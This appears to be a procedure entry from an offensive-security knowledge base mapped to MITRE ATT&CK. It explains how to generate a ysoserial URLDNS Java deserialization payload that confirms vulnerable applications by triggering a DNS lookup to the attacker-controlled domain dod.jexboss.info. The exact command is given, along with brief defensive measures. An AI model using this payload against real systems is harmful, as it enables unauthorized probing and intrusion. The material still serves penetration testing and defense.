---
tags:
  - payload-generation
  - rce
  - dns
type: procedure
tools:
  - '[[tools/Ysoserial]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/java-ysoserial-urldns]]'
verified: false
platforms:
  - Linux
  - Java
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:27.266Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6352e3b5-9502-4782-b21c-639b272893de
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
---

# Generate-URLDNS-Payload

## Summary

This procedure generates a Java serialized payload using the URLDNS gadget in ysoserial to trigger a DNS lookup upon deserialization, confirming RCE without direct command execution in vulnerable Java applications like Oracle PeopleSoft.

## Description

The URLDNS gadget forces the deserializer to resolve a URL, resulting in a DNS query to a attacker-controlled domain. This is ideal for proof-of-concept in environments where direct RCE might be noisy. Targets unvalidated readObject() calls in web services.

## Requirements

1. Built ysoserial JAR available
2. Control over a DNS domain (e.g., dod.jexboss.info)
3. Java runtime environment

## Defense

Defensive measures and detection strategies:

- Implement deserialization filters (e.g., NotSoSerial) or allowlists
- Monitor for anomalous DNS queries from application servers
- Log deserialization attempts and validate input types

## Objectives

1. Create serialized gadget chain for DNS exfiltration
2. Output binary payload for transmission
3. Confirm exploitability via external observable

## Instructions

### Step 1: Execute Ysoserial with URLDNS Gadget

**Context**: Generate the payload targeting the controlled DNS domain.

**Command** ([[commands/java-ysoserial-urldns]]):
```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

> Runs ysoserial to produce binary output redirected to 'payload'. Expected output: Silent success with file creation; errors if JAR missing or invalid gadget.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/java-ysoserial-urldns]]

## Tools Used

- [[tools/Ysoserial]]

## Tags

- payload-generation
- rce
- dns
